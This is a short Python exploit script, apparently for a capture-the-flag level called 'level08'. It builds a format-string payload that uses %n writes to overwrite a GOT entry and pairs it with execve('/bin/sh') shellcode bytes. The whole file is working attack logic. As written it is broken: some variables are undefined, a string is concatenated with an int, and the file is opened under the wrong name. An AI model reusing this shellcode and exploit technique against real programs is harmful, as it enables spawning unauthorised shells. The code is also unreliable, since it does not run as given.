# import struct
#
#
#
# exploit=""
# exploit+="%x"
# exploit+="%10$n"
#
#!/usr/bin/env python3

import struct

ADDR_FPRINTF_GOT=0x601fd2
ADDR_STACK_LOGWRAPPER = 0x7fffffffebc0


ADDR_ARG=0x7fffffffefc6+LEN_FILE
payload=b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

ADDR_LOW = (ADDR_ARG & 0xffff) - 8
ADDR_HIGH = ((ADDR_ARG >> 16) & 0xffff) + 0x10000 - 8
#
print(hex(ADDR_LOW), hex(ADDR_HIGH))
#
exploit = struct.pack("I", EXIT_GOT)
exploit += struct.pack("I", EXIT_GOT + 2)


exploit += f"%{ADDR_LOW}x".encode("ascii")
exploit += "%10$n".encode("ascii")
exploit += f"%{ADDR_HIGH - ADDR_LOW}x".encode("ascii")
exploit += "%11$n".encode("ascii")

print("len de exploit " + len(exploit))

# payload=b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

with open(exploit, 'w') as file:
    pass

print(f"./level08 {exploit} {payload}")
